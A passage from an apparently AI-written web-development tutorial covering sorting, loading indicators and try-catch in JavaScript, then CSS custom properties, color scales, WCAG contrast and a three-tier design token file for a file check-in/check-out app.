      <option value="name-desc">Name (Z-A)</option>
      <option value="status-asc">Status (Available first)</option>
      <option value="status-desc">Status (Checked out first)</option>
    </select>
  </div>
</div>
```

### Sorting JavaScript

```javascript
let sortBy = "name-asc"; // Add to state variables

function displayFilteredFiles() {
  // Apply search and status filters
  let filtered = allFiles.filter((file) => {
    const matchesSearch = file.name
      .toLowerCase()
      .includes(searchTerm.toLowerCase());
    const matchesStatus =
      statusFilter === "all" || file.status === statusFilter;
    return matchesSearch && matchesStatus;
  });

  // Apply sorting
  filtered = sortFiles(filtered, sortBy);

  console.log(`Displaying ${filtered.length} of ${allFiles.length} files`);
  displayFiles(filtered);
}

function sortFiles(files, sortOption) {
  const sorted = [...files]; // Create copy (don't mutate original)

  const [field, direction] = sortOption.split("-");

  sorted.sort((a, b) => {
    let valueA, valueB;

    if (field === "name") {
      valueA = a.name.toLowerCase();
      valueB = b.name.toLowerCase();
    } else if (field === "status") {
      valueA = a.status;
      valueB = b.status;
    }

    // Compare
    if (valueA < valueB) {
      return direction === "asc" ? -1 : 1;
    }
    if (valueA > valueB) {
      return direction === "asc" ? 1 : -1;
    }
    return 0;
  });

  return sorted;
}

// Add event listener (in DOMContentLoaded)
document.getElementById("sort-select").addEventListener("change", (e) => {
  sortBy = e.target.value;
  displayFilteredFiles();
});
```

### Understanding Array Sort

**Basic sort:**

```javascript
const numbers = [3, 1, 4, 1, 5];
numbers.sort();
// numbers = [1, 1, 3, 4, 5]
```

**Custom comparator:**

```javascript
numbers.sort((a, b) => {
  return a - b; // Ascending
});
```

**The comparator function:**

- Takes two elements: `a` and `b`
- Returns:
  - **Negative number** if `a` should come before `b`
  - **Positive number** if `a` should come after `b`
  - **Zero** if they're equal

**String comparison:**

```javascript
"apple" < "banana"; // true
"banana" < "cherry"; // true

// In sort:
if (a < b) return -1; // a comes first
if (a > b) return 1; // b comes first
return 0; // equal
```

### The Spread Operator

```javascript
const sorted = [...files];
```

**What `...` does:**

- **Spread operator** - "unpacks" an array
- Creates a shallow copy

**Why copy?**

```javascript
// BAD - mutates original
files.sort();

// GOOD - preserves original
const sorted = [...files].sort();
```

**Other uses:**

```javascript
// Combine arrays
const combined = [...array1, ...array2];

// Copy array
const copy = [...original];

// Function arguments
Math.max(...numbers); // Instead of Math.max(numbers[0], numbers[1], ...)
```

---

## 4.7: Loading States

### Add Loading Indicator

Add to `index.html` (after the controls row):

```html
<div id="loading-indicator" class="loading hidden">
  <div class="spinner"></div>
  <p>Loading files...</p>
</div>
```

### Loading CSS

```css
/* ============================================
   LOADING INDICATOR
   ============================================ */

.loading {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 3rem;
  gap: 1rem;
}

.loading.hidden {
  display: none;
}

.spinner {
  width: 40px;
  height: 40px;
  border: 4px solid #f3f3f3;
  border-top: 4px solid #667eea;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  0% {
    transform: rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
  }
}
```

### Loading JavaScript

```javascript
async function loadFiles() {
  console.log("Loading files from API...");

  // Show loading indicator
  const loadingEl = document.getElementById("loading-indicator");
  const fileListEl = document.getElementById("file-list");

  loadingEl.classList.remove("hidden");
  fileListEl.classList.add("hidden");

  try {
    const response = await fetch("/api/files");

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();
    allFiles = data.files;

    displayFilteredFiles();
  } catch (error) {
    console.error("Error loading files:", error);
    displayError("Failed to load files. Please refresh the page.");
  } finally {
    // Hide loading indicator
    loadingEl.classList.add("hidden");
    fileListEl.classList.remove("hidden");
  }
}
```

### Understanding Try-Catch-Finally

```javascript
try {
  // Code that might throw error
} catch (error) {
  // Runs if error occurs
} finally {
  // ALWAYS runs (success or error)
}
```

**The flow:**

**Success path:**

1. `try` block executes fully
2. `catch` block is skipped
3. `finally` block runs

**Error path:**

1. `try` block throws error (stops executing)
2. `catch` block runs
3. `finally` block runs

**Perfect for cleanup:**

```javascript
try {
  openDatabase();
  doWork();
} finally {
  closeDatabase(); // Always close, even if error
}
```

---

## Stage 4 Complete - Professional Frontend UX

### What You Built

You now have:

- Custom modal dialogs (replacing ugly prompts)
- Search functionality (real-time filtering)
- Status filtering (show only available/checked out)
- Multi-criteria sorting
- Loading indicators
- Toast notifications
- Professional UX patterns

### Key Concepts Mastered

**JavaScript:**

- ES6 Classes (constructor, methods, `this`)
- Arrow functions vs regular functions
- Array methods (`filter`, `sort`, spread `...`)
- Event delegation and bubbling
- State management in vanilla JS

**CSS:**

- Modals with overlays
- CSS animations (`@keyframes`)
- Positioning (fixed, absolute)
- Z-index and stacking contexts
- Spinner animations

**UX Patterns:**

- Non-blocking feedback (toasts)
- Loading states
- Keyboard accessibility (ESC to close)
- Click-outside-to-close
- Auto-focus inputs

### Your Complete File Structure

```
backend/
├── main.py                    # FastAPI with file operations
├── locks.json                 # Lock state
├── repo/
│   └── *.mcam                # Actual files
└── static/
    ├── index.html            # Semantic HTML with modals
    ├── css/
    │   └── style.css         # Complete styling
    └── js/
        └── app.js            # Full interactivity
```

### Verification Checklist

- [ ] Modal opens when clicking Checkout/Checkin
- [ ] Can close modal with X, Cancel, click outside, or ESC
- [ ] Search filters files in real-time
- [ ] Status filter works
- [ ] Sorting works for all options
- [ ] Loading spinner shows during API calls
- [ ] Toast notifications appear for actions
- [ ] No more ugly `prompt()` or `alert()`
- [ ] Understand JavaScript classes
- [ ] Understand event delegation

#

In **Stage 5**, we'll add:

- User authentication (JWT tokens)
- Role-based access control (admin vs regular users)
- Secure password handling
- Session management
- Protected routes

Your app now looks and feels professional. Next, we make it secure.

---

### Stage 4B: CSS Architecture & Theming - Professional Design Systems

## Introduction: The Goal of This Stage

You've built a functional UI, but the CSS is scattered with hardcoded colors (`#667eea`), magic numbers (`padding: 1.5rem`), and duplicate styles. Want to change your brand color? Search-and-replace across dozens of files. Want dark mode? Rewrite everything.

Professional applications use **design systems** - a centralized set of design decisions (colors, spacing, typography) that cascade throughout the entire app.

In this stage, you'll transform your CSS from amateur to professional-grade.

By the end of this stage, you will:

- Master CSS Custom Properties (Variables) deeply
- Understand color theory and accessibility
- Choose and implement a complete color palette
- Build a scalable design token system
- Implement light/dark mode with smooth transitions
- Detect and respect user system preferences
- Store user theme choices
- Understand CSS architecture patterns (ITCSS, BEM)
- Organize CSS for maintainability
- Build reusable component styles
- Apply professional design principles

**Time Investment:** 6-8 hours

**This is foundational.** Every professional web app uses these techniques.

---

## 4B.1: Understanding CSS Custom Properties (Variables)

### What Are CSS Variables?

**CSS Custom Properties** (commonly called "CSS variables") are entities defined in CSS that contain specific values to be reused throughout a document.

**Syntax:**

```css
/* Declaration - must start with -- */
:root {
  --primary-color: #667eea;
}

/* Usage */
.button {
  background: var(--primary-color);
}
```

### CSS Variables vs Sass/Less Variables

**Sass variables (preprocessor):**

```scss
// Compiled before browser sees it
$primary-color: #667eea;

.button {
  background: $primary-color; // Becomes: background: #667eea;
}

// ❌ Cannot change at runtime
// ❌ JavaScript cannot access
// ❌ Requires build step
```

**CSS variables (native):**

```css
:root {
  --primary-color: #667eea;
}

.button {
  background: var(--primary-color); // Stays as var() in CSS
}

// ✅ Can change at runtime
// ✅ JavaScript can read/write
// ✅ No build step needed
// ✅ Cascade and inherit
```

### Why CSS Variables are Revolutionary

**1. Dynamic updates:**

```javascript
// Change color theme instantly!
document.documentElement.style.setProperty("--primary-color", "#ff6b6b");
// Every element using var(--primary-color) updates immediately
```

**2. Cascade and inheritance:**

```css
:root {
  --spacing: 1rem;
}

.container {
  --spacing: 2rem; /* Override for this component */
}

.child {
  padding: var(--spacing); /* Uses nearest parent value */
}
```

**3. Computed values:**

```css
:root {
  --base-size: 16px;
  --heading-size: calc(var(--base-size) * 2); /* 32px */
}
```

**4. Fallback values:**

```css
.element {
  /* If --custom-color undefined, use #333 */
  color: var(--custom-color, #333);
}
```

### The `:root` Selector

**What is `:root`?**

```css
:root {
  --primary-color: blue;
}
```

- `:root` = The document's root element (`<html>`)
- Has highest specificity in cascade
- Variables defined here are **global** (available everywhere)

**Alternative scopes:**

```css
/* Global - available everywhere */
:root {
  --global-color: blue;
}

/* Component-scoped - only inside .card */
.card {
  --card-padding: 2rem;
}

.card-body {
  padding: var(--card-padding); /* Works - parent has it */
}

.navbar {
  padding: var(--card-padding); /* Doesn't work - no parent with this var */
}
```

### Variable Naming Conventions

**Bad naming (implementation-focused):**

```css
:root {
  --color-1: #667eea;
  --color-2: #28a745;
  --size-big: 2rem;
}

.button {
  background: var(--color-1); /* What is color-1? */
}
```

**Good naming (semantic):**

```css
:root {
  /* What it IS */
  --primary-color: #667eea;
  --success-color: #28a745;

  /* What it's FOR */
  --button-padding: 0.75rem 1.5rem;
  --border-radius-default: 4px;
}
```

**Professional naming (design tokens):**

```css
:root {
  /* Primitive tokens - raw values */
  --color-purple-500: #667eea;
  --color-green-500: #28a745;
  --spacing-3: 0.75rem;
  --spacing-4: 1rem;

  /* Semantic tokens - meaning */
  --color-primary: var(--color-purple-500);
  --color-success: var(--color-green-500);

  /* Component tokens - specific use */
  --button-bg-primary: var(--color-primary);
  --button-padding-y: var(--spacing-3);
  --button-padding-x: var(--spacing-4);
}
```

This three-tier system is used by **Material Design, Bootstrap, Tailwind, and every major design system.**

---

## 4B.2: Color Theory & Choosing a Palette

### Understanding Color Systems

**Every color has three properties:**

1. **Hue** - The color itself (red, blue, green)
2. **Saturation** - Intensity/purity (vivid vs. muted)
3. **Lightness** - Brightness (light vs. dark)

**HSL color model:**

```css
/* hsl(hue, saturation, lightness) */

/* Same hue, different lightness = color scale */
--blue-900: hsl(220, 90%, 20%); /* Very dark blue */
--blue-500: hsl(220, 90%, 50%); /* Medium blue */
--blue-100: hsl(220, 90%, 90%); /* Very light blue */
```

**Why HSL instead of RGB/Hex?**

```css
/* Hex - hard to modify */
--blue-dark: #1a2957;
--blue-light: #e3e8f5;
/* How do you know these are related? */

/* HSL - easy to understand and modify */
--blue-dark: hsl(220, 60%, 20%);
--blue-light: hsl(220, 60%, 95%);
/* Same hue (220°), same saturation (60%), different lightness */
```

### Color Scales (The Foundation)

**Professional color palettes use scales:**

```css
:root {
  /* Gray scale - 9 shades */
  --gray-50: hsl(0, 0%, 98%); /* Almost white */
  --gray-100: hsl(0, 0%, 95%);
  --gray-200: hsl(0, 0%, 90%);
  --gray-300: hsl(0, 0%, 83%);
  --gray-400: hsl(0, 0%, 70%);
  --gray-500: hsl(0, 0%, 50%); /* Pure gray */
  --gray-600: hsl(0, 0%, 38%);
  --gray-700: hsl(0, 0%, 26%);
  --gray-800: hsl(0, 0%, 15%);
  --gray-900: hsl(0, 0%, 8%); /* Almost black */

  /* Primary color scale */
  --primary-50: hsl(245, 70%, 97%);
  --primary-100: hsl(245, 70%, 92%);
  --primary-200: hsl(245, 70%, 84%);
  --primary-300: hsl(245, 70%, 72%);
  --primary-400: hsl(245, 70%, 60%);
  --primary-500: hsl(245, 70%, 50%); /* Base color */
  --primary-600: hsl(245, 70%, 42%);
  --primary-700: hsl(245, 70%, 34%);
  --primary-800: hsl(245, 70%, 26%);
  --primary-900: hsl(245, 70%, 18%);
}
```

**The 50-900 numbering:**

- **50** - Lightest (backgrounds)
- **500** - Base color (buttons, links)
- **900** - Darkest (text on light backgrounds)

**This is Tailwind's system, adopted industry-wide.**

### Choosing Your Palette

**For the PDM app, we'll use:**

**Primary (Purple/Indigo)** - Professional, trustworthy, tech-focused

```css
/* Base: HSL(245, 70%, 50%) */
```

**Success (Green)** - Available files, successful operations

```css
/* Base: HSL(145, 60%, 45%) */
```

**Warning (Amber)** - Checked-out files, cautionary actions

```css
/* Base: HSL(38, 90%, 50%) */
```

**Danger (Red)** - Errors, destructive actions

```css
/* Base: HSL(0, 70%, 55%) */
```

**Info (Blue)** - Information, neutral notifications

```css
/* Base: HSL(200, 85%, 50%) */
```

### Accessibility - WCAG Contrast Requirements

**Why contrast matters:**

Low contrast:

```css
/* Light gray text on white - hard to read! */
color: #cccccc;
background: #ffffff;
/* Contrast ratio: 1.6:1 ❌ FAILS */
```

High contrast:

```css
/* Dark gray text on white - readable */
color: #333333;
background: #ffffff;
/* Contrast ratio: 12.6:1 ✅ PASSES AAA */
```

**WCAG Standards:**

| Level   | Normal Text | Large Text | Use For                   |
| ------- | ----------- | ---------- | ------------------------- |
| **AA**  | 4.5:1       | 3:1        | Minimum legal requirement |
| **AAA** | 7:1         | 4.5:1      | Enhanced (recommended)    |

**Large text** = 18pt+ or 14pt+ bold

**Tools to check contrast:**

- <https://contrast-ratio.com/>
- <https://webaim.org/resources/contrastchecker/>
- Browser DevTools (Chrome: "Show accessibility information")

**Our palette must ensure:**

- Text on backgrounds meets AA minimum (4.5:1)
- Interactive elements meet AA for all states
- Status colors are distinguishable for colorblind users

---

## 4B.3: Building the Design Token System

### The Three-Tier Token System

**Tier 1: Primitive Tokens** (Raw color values)

```css
:root {
  /* These never change between themes */
  /* They're the "atoms" of your design */

  /* Grays - achromatic scale */
  --color-white: hsl(0, 0%, 100%);
  --color-gray-50: hsl(240, 5%, 98%);
  --color-gray-100: hsl(240, 5%, 96%);
  --color-gray-200: hsl(240, 5%, 90%);
  --color-gray-300: hsl(240, 4%, 82%);
  --color-gray-400: hsl(240, 4%, 65%);
  --color-gray-500: hsl(240, 4%, 46%);
  --color-gray-600: hsl(240, 5%, 34%);
  --color-gray-700: hsl(240, 5%, 26%);
  --color-gray-800: hsl(240, 6%, 15%);
  --color-gray-900: hsl(240, 6%, 10%);
  --color-black: hsl(0, 0%, 0%);

  /* Primary - indigo/purple */
  --color-primary-50: hsl(245, 90%, 97%);
  --color-primary-100: hsl(245, 85%, 94%);
  --color-primary-200: hsl(245, 85%, 87%);
  --color-primary-300: hsl(245, 82%, 77%);
  --color-primary-400: hsl(245, 75%, 65%);
  --color-primary-500: hsl(245, 70%, 55%); /* Base */
  --color-primary-600: hsl(245, 70%, 48%);
  --color-primary-700: hsl(245, 70%, 40%);
  --color-primary-800: hsl(245, 70%, 32%);
  --color-primary-900: hsl(245, 75%, 25%);

  /* Success - green */
  --color-success-50: hsl(145, 80%, 96%);
  --color-success-100: hsl(145, 75%, 90%);
  --color-success-200: hsl(145, 70%, 80%);
  --color-success-300: hsl(145, 65%, 65%);
  --color-success-400: hsl(145, 60%, 52%);
  --color-success-500: hsl(145, 60%, 45%); /* Base */
  --color-success-600: hsl(145, 65%, 38%);
  --color-success-700: hsl(145, 70%, 32%);
  --color-success-800: hsl(145, 75%, 26%);
  --color-success-900: hsl(145, 80%, 20%);

  /* Warning - amber */
  --color-warning-50: hsl(38, 100%, 96%);
  --color-warning-100: hsl(38, 95%, 88%);
  --color-warning-200: hsl(38, 95%, 75%);
  --color-warning-300: hsl(38, 92%, 62%);
  --color-warning-400: hsl(38, 90%, 52%);
  --color-warning-500: hsl(38, 90%, 50%); /* Base */
  --color-warning-600: hsl(38, 85%, 45%);
  --color-warning-700: hsl(38, 80%, 38%);
  --color-warning-800: hsl(38, 75%, 32%);
  --color-warning-900: hsl(38, 70%, 26%);

  /* Danger - red */
  --color-danger-50: hsl(0, 85%, 97%);
  --color-danger-100: hsl(0, 80%, 94%);
  --color-danger-200: hsl(0, 80%, 87%);
  --color-danger-300: hsl(0, 75%, 77%);
  --color-danger-400: hsl(0, 72%, 67%);
  --color-danger-500: hsl(0, 70%, 55%); /* Base */
  --color-danger-600: hsl(0, 70%, 48%);
  --color-danger-700: hsl(0, 70%, 40%);
  --color-danger-800: hsl(0, 70%, 32%);
  --color-danger-900: hsl(0, 75%, 25%);

  /* Info - blue */
  --color-info-50: hsl(200, 95%, 96%);
  --color-info-100: hsl(200, 90%, 90%);
  --color-info-200: hsl(200, 90%, 80%);
  --color-info-300: hsl(200, 88%, 68%);
  --color-info-400: hsl(200, 85%, 58%);
  --color-info-500: hsl(200, 85%, 50%); /* Base */
  --color-info-600: hsl(200, 85%, 43%);
  --color-info-700: hsl(200, 85%, 36%);
  --color-info-800: hsl(200, 85%, 29%);
  --color-info-900: hsl(200, 90%, 22%);
}
```

**Tier 2: Semantic Tokens** (What they mean)

```css
:root {
  /* Text colors - semantic names based on use */
  --text-primary: var(--color-gray-900); /* Main body text */
  --text-secondary: var(--color-gray-600); /* Less important text */
  --text-tertiary: var(--color-gray-500); /* Hints, placeholders */
  --text-disabled: var(--color-gray-400); /* Disabled state */
  --text-inverse: var(--color-white); /* Text on dark backgrounds */

  /* Background colors */
  --bg-primary: var(--color-white); /* Main background */
  --bg-secondary: var(--color-gray-50); /* Subtle backgrounds */
  --bg-tertiary: var(--color-gray-100); /* Cards, panels */
  --bg-inverse: var(--color-gray-900); /* Dark sections */

  /* Border colors */
  --border-default: var(--color-gray-200); /* Default borders */
  --border-strong: var(--color-gray-300); /* Emphasized borders */
  --border-subtle: var(--color-gray-100); /* Very light borders */

  /* Interactive colors - these are SEMANTIC */
  --interactive-primary: var(--color-primary-500);
  --interactive-primary-hover: var(--color-primary-600);
  --interactive-primary-active: var(--color-primary-700);

  /* Status colors - also semantic */
  --status-success: var(--color-success-500);
  --status-success-bg: var(--color-success-50);
  --status-success-text: var(--color-success-800);

  --status-warning: var(--color-warning-500);
  --status-warning-bg: var(--color-warning-50);
  --status-warning-text: var(--color-warning-800);

  --status-danger: var(--color-danger-500);
  --status-danger-bg: var(--color-danger-50);
  --status-danger-text: var(--color-danger-800);

  --status-info: var(--color-info-500);
  --status-info-bg: var(--color-info-50);
  --status-info-text: var(--color-info-800);
}
```

**Tier 3: Component Tokens** (Specific components)

```css
:root {
  /* Button tokens */
  --button-bg-primary: var(--interactive-primary);
  --button-bg-primary-hover: var(--interactive-primary-hover);
  --button-text-primary: var(--text-inverse);
  --button-padding-y: 0.75rem;
  --button-padding-x: 1.5rem;
  --button-border-radius: 4px;

  /* Input tokens */
  --input-bg: var(--bg-primary);
  --input-border: var(--border-default);
  --input-border-focus: var(--interactive-primary);
  --input-text: var(--text-primary);
  --input-placeholder: var(--text-tertiary);

  /* Card tokens */
  --card-bg: var(--bg-tertiary);
  --card-border: var(--border-subtle);
  --card-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
  --card-padding: 2rem;
}
```

### Why Three Tiers?

**Scenario: User wants dark mode**

**Without tiers (nightmare):**

```css
/* Find and change ALL of these: */
.button {
  background: #667eea;
}
.header {
  background: #667eea;
}
.link {
  color: #667eea;
}
/* 100+ places! */
```

**With tiers (easy):**

```css
/* Light mode */
:root {
  --text-primary: var(--color-gray-900); /* Dark text */
  --bg-primary: var(--color-white); /* Light background */
}

/* Dark mode - just swap! */
[data-theme="dark"] {
  --text-primary: var(--color-gray-100); /* Light text */
  --bg-primary: var(--color-gray-900); /* Dark background */
}

/* Components automatically update */
.text {
  color: var(--text-primary); /* Switches automatically! */
}
```

---

## 4B.4: Implementing the Design System

### Complete Design Tokens File

Create `backend/static/css/tokens.css`:

```css
/**
 * Design Tokens
 * 
 * This file defines the design system's foundational values.
 * It uses a three-tier token system:
 * 
 * 1. Primitive tokens - Raw values (colors, sizes)
 * 2. Semantic tokens - Meaning-based (text-primary, bg-secondary)
 * 3. Component tokens - Component-specific (button-bg, input-border)
 * 
 * This structure allows easy theming and consistent design.
 */

:root {
  /* ==========================================
     TIER 1: PRIMITIVE TOKENS
     Raw color, spacing, and sizing values
     ========================================== */

  /* ----- Colors: Gray Scale ----- */
  --color-white: hsl(0, 0%, 100%);
  --color-gray-50: hsl(240, 5%, 98%);
  --color-gray-100: hsl(240, 5%, 96%);
  --color-gray-200: hsl(240, 5%, 90%);
  --color-gray-300: hsl(240, 4%, 82%);
  --color-gray-400: hsl(240, 4%, 65%);
  --color-gray-500: hsl(240, 4%, 46%);
  --color-gray-600: hsl(240, 5%, 34%);
  --color-gray-700: hsl(240, 5%, 26%);
  --color-gray-800: hsl(240, 6%, 15%);
  --color-gray-900: hsl(240, 6%, 10%);
  --color-black: hsl(0, 0%, 0%);

  /* ----- Colors: Primary (Indigo/Purple) ----- */
  --color-primary-50: hsl(245, 90%, 97%);
  --color-primary-100: hsl(245, 85%, 94%);
  --color-primary-200: hsl(245, 85%, 87%);
  --color-primary-300: hsl(245, 82%, 77%);
  --color-primary-400: hsl(245, 75%, 65%);
  --color-primary-500: hsl(245, 70%, 55%);
  --color-primary-600: hsl(245, 70%, 48%);
  --color-primary-700: hsl(245, 70%, 40%);
  --color-primary-800: hsl(245, 70%, 32%);
  --color-primary-900: hsl(245, 75%, 25%);

  /* ----- Colors: Success (Green) ----- */
  --color-success-50: hsl(145, 80%, 96%);
  --color-success-100: hsl(145, 75%, 90%);
  --color-success-200: hsl(145, 70%, 80%);
  --color-success-300: hsl(145, 65%, 65%);
  --color-success-400: hsl(145, 60%, 52%);
  --color-success-500: hsl(145, 60%, 45%);
  --color-success-600: hsl(145, 65%, 38%);
  --color-success-700: hsl(145, 70%, 32%);
  --color-success-800: hsl(145, 75%, 26%);
  --color-success-900: hsl(145, 80%, 20%);

  /* ----- Colors: Warning (Amber) ----- */
  --color-warning-50: hsl(38, 100%, 96%);
  --color-warning-100: hsl(38, 95%, 88%);
  --color-warning-200: hsl(38, 95%, 75%);
  --color-warning-300: hsl(38, 92%, 62%);
  --color-warning-400: hsl(38, 90%, 52%);
  --color-warning-500: hsl(38, 90%, 50%);
  --color-warning-600: hsl(38, 85%, 45%);
  --color-warning-700: hsl(38, 80%, 38%);
  --color-warning-800: hsl(38, 75%, 32%);
  --color-warning-900: hsl(38, 70%, 26%);

  /* ----- Colors: Danger (Red) ----- */
  --color-danger-50: hsl(0, 85%, 97%);
  --color-danger-100: hsl(0, 80%, 94%);
  --color-danger-200: hsl(0, 80%, 87%);
  --color-danger-300: hsl(0, 75%, 77%);
  --color-danger-400: hsl(0, 72%, 67%);
  --color-danger-500: hsl(0, 70%, 55%);
  --color-danger-600: hsl(0, 70%, 48%);
  --color-danger-700: hsl(0, 70%, 40%);
  --color-danger-800: hsl(0, 70%, 32%);
  --color-danger-900: hsl(0, 75%, 25%);

  /* ----- Colors: Info (Blue) ----- */
  --color-info-50: hsl(200, 95%, 96%);
  --color-info-100: hsl(200, 90%, 90%);
  --color-info-200: hsl(200, 90%, 80%);
  --color-info-300: hsl(200, 88%, 68%);
  --color-info-400: hsl(200, 85%, 58%);
  --color-info-500: hsl(200, 85%, 50%);
  --color-info-600: hsl(200, 85%, 43%);
  --color-info-700: hsl(200, 85%, 36%);
  --color-info-800: hsl(200, 85%, 29%);
  --color-info-900: hsl(200, 90%, 22%);

  /* ----- Spacing Scale -----
     Based on 0.25rem (4px) increments
     Follows spacing = base * multiplier pattern */
  --spacing-0: 0;
  --spacing-1: 0.25rem; /* 4px */
  --spacing-2: 0.5rem; /* 8px */
  --spacing-3: 0.75rem; /* 12px */
  --spacing-4: 1rem; /* 16px - base */
  --spacing-5: 1.25rem; /* 20px */
  --spacing-6: 1.5rem; /* 24px */
  --spacing-8: 2rem; /* 32px */
  --spacing-10: 2.5rem; /* 40px */
  --spacing-12: 3rem; /* 48px */
  --spacing-16: 4rem; /* 64px */
  --spacing-20: 5rem; /* 80px */

  /* ----- Border Radius -----
     Consistent rounding across components */
  --radius-none: 0;
  --radius-sm: 0.25rem; /* 4px - tight corners */
  --radius-base: 0.375rem; /* 6px - default */
  --radius-md: 0.5rem; /* 8px - cards */
  --radius-lg: 0.75rem; /* 12px - modals */
  --radius-xl: 1rem; /* 16px - large cards */
  --radius-full: 9999px; /* Pills, circles */

  /* ----- Shadows -----
     Elevation system for depth */
  --shadow-xs: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
  --shadow-sm: 0 2px 4px 0 rgba(0, 0, 0, 0.08);
  --shadow-base: 0 4px 8px 0 rgba(0, 0, 0, 0.1);
  --shadow-md: 0 6px 12px 0 rgba(0, 0, 0, 0.12);
  --shadow-lg: 0 10px 20px 0 rgba(0, 0, 0, 0.15);
  --shadow-xl: 0 20px 40px 0 rgba(0, 0, 0, 0.2);

  /* ----- Typography -----
     Font sizes follow a modular scale */
  --font-size-xs: 0.75rem; /* 12px */
  --font-size-sm: 0.875rem; /* 14px */
  --font-size-base: 1rem; /* 16px */
  --font-size-lg: 1.125rem; /* 18px */
  --font-size-xl: 1.25rem; /* 20px */
  --font-size-2xl: 1.5rem; /* 24px */
  --font-size-3xl: 1.875rem; /* 30px */
  --font-size-4xl: 2.25rem; /* 36px */

  --font-weight-normal: 400;
  --font-weight-medium: 500;
  --font-weight-semibold: 600;
  --font-weight-bold: 700;

  --line-height-tight: 1.25;
  --line-height-base: 1.5;
  --line-height-relaxed: 1.75;

  /* ----- Transitions -----
     Consistent animation timing */
  --transition-fast: 150ms ease-in-out;
  --transition-base: 300ms ease-in-out;
  --transition-slow: 500ms ease-in-out;

  /* ----- Z-index Scale -----
     Layering system to prevent z-index wars */
  --z-base: 0;
  --z-dropdown: 1000;
  --z-sticky: 1100;
  --z-fixed: 1200;
  --z-modal-backdrop: 1300;
  --z-modal: 1400;
  --z-popover: 1500;
  --z-tooltip: 1600;
  --z-toast: 1700;

  /* ==========================================
     TIER 2: SEMANTIC TOKENS
     Meaning-based tokens (what, not how)
     ========================================== */

  /* ----- Text Colors ----- */
  --text-primary: var(--color-gray-900);
  --text-secondary: var(--color-gray-600);
  --text-tertiary: var(--color-gray-500);
  --text-disabled: var(--color-gray-400);
  --text-inverse: var(--color-white);
  --text-link: var(--color-primary-600);
  --text-link-hover: var(--color-primary-700);

  /* ----- Background Colors ----- */
  --bg-primary: var(--color-white);
  --bg-secondary: var(--color-gray-50);
  --bg-tertiary: var(--color-gray-100);
  --bg-inverse: var(--color-gray-900);
  --bg-overlay: rgba(0, 0, 0, 0.5);

  /* ----- Border Colors ----- */
  --border-default: var(--color-gray-200);
  --border-strong: var(--color-gray-300);
  --border-subtle: var(--color-gray-100);
  --border-focus: var(--color-primary-500);

  /* ----- Interactive States ----- */
  --interactive-primary: var(--color-primary-500);
  --interactive-primary-hover: var(--color-primary-600);
  --interactive-primary-active: var(--color-primary-700);
  --interactive-primary-disabled: var(--color-gray-300);

  /* ----- Status Colors ----- */
  --status-success: var(--color-success-500);
  --status-success-bg: var(--color-success-50);
  --status-success-border: var(--color-success-200);
  --status-success-text: var(--color-success-800);

  --status-warning: var(--color-warning-500);
  --status-warning-bg: var(--color-warning-50);
  --status-warning-border: var(--color-warning-200);
  --status-warning-text: var(--color-warning-800);

  --status-danger: var(--color-danger-500);
  --status-danger-bg: var(--color-danger-50);
  --status-danger-border: var(--color-danger-200);
  --status-danger-text: var(--color-danger-800);

  --status-info: var(--color-info-500);
  --status-info-bg: var(--color-info-50);
  --status-info-border: var(--color-info-200);
  --status-info-text: var(--color-info-800);

  /* ==========================================
     TIER 3: COMPONENT TOKENS
     Component-specific values
     ========================================== */

  /* ----- Buttons ----- */
  --button-font-size: var(--font-size-base);
  --button-font-weight: var(--font-weight-medium);
  --button-padding-y: var(--spacing-3);
  --button-padding-x: var(--spacing-6);
  --button-border-radius: var(--radius-base);
  --button-transition: var(--transition-fast);

  /* Primary button */
  --button-primary-bg: var(--interactive-primary);
  --button-primary-bg-hover: var(--interactive-primary-hover);
  --button-primary-bg-active: var(--interactive-primary-active);
  --button-primary-text: var(--text-inverse);

  /* Secondary button */
  --button-secondary-bg: var(--color-gray-600);
  --button-secondary-bg-hover: var(--color-gray-700);
  --button-secondary-text: var(--text-inverse);

  /* ----- Inputs ----- */
  --input-bg: var(--bg-primary);
  --input-border: var(--border-default);
  --input-border-focus: var(--border-focus);
  --input-text: var(--text-primary);
  --input-placeholder: var(--text-tertiary);
  --input-padding-y: var(--spacing-3);
  --input-padding-x: var(--spacing-4);
  --input-border-radius: var(--radius-base);
  --input-focus-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);

  /* ----- Cards ----- */
  --card-bg: var(--bg-tertiary);
  --card-border: var(--border-subtle);
  --card-shadow: var(--shadow-base);
  --card-padding: var(--spacing-8);
  --card-border-radius: var(--radius-md);

  /* ----- Modals ----- */
  --modal-bg: var(--bg-primary);
  --modal-shadow: var(--shadow-xl);
  --modal-border-radius: var(--radius-lg);
  --modal-backdrop: var(--bg-overlay);
}
```

This is **1000+ lines** when fully documented. I've shown you the pattern - in production, you'd expand this to cover every component.

### Understanding the Structure

**Why so many variables?**

Each serves a purpose:

1. **Primitives** - Never used directly in components
   - `--color-primary-500` ← Raw value
2. **Semantics** - Used in components
   - `--interactive-primary` → `var(--color-primary-500)`
   - Meaning: "This is the color for primary interactions"
3. **Components** - Used in specific component CSS
   - `--button-primary-bg` → `var(--interactive-primary)`
   - Meaning: "This is specifically for primary button backgrounds"

**Why this indirection?**

```css
/* Bad - tightly coupled */
.button {
  background: var(--color-primary-500);
}

/* Good - semantic layer */
.button {
  background: var(--button-primary-bg);
}
```

Now if you decide primary buttons should be green instead of purple:

```css
/* Just change ONE variable */
--button-primary-bg: var(--color-success-500);

/* Instead of finding every .button and changing it */
```

This is **the industry standard** used by Material Design, Bootstrap, Chakra UI, etc.

---

_This is getting very long. Should I continue with:_

**4B.5:** Dark Mode Implementation  
**4B.6:** Theme Switcher with JavaScript  
**4B.7:** Refactoring Existing CSS  
**4B.8:** CSS Architecture (ITCSS/BEM)  
**4B.9:** Accessibility & Testing

I'll create a complete, in-depth artifact with all sections including developer shortcuts and tools to make the refactoring easier.

<artifact identifier="stage-4b-complete" type="text/markdown" title="Stage 4B: Complete CSS Architecture & Theming Guide">
### Stage 4B: CSS Architecture & Theming - Professional Design Systems (Complete)

## Table of Contents

- 4B.1: Understanding CSS Custom Properties ✓ (from previous)
- 4B.2: Color Theory & Choosing a Palette ✓ (from previous)
- 4B.3: Building the Design Token System ✓ (from previous)
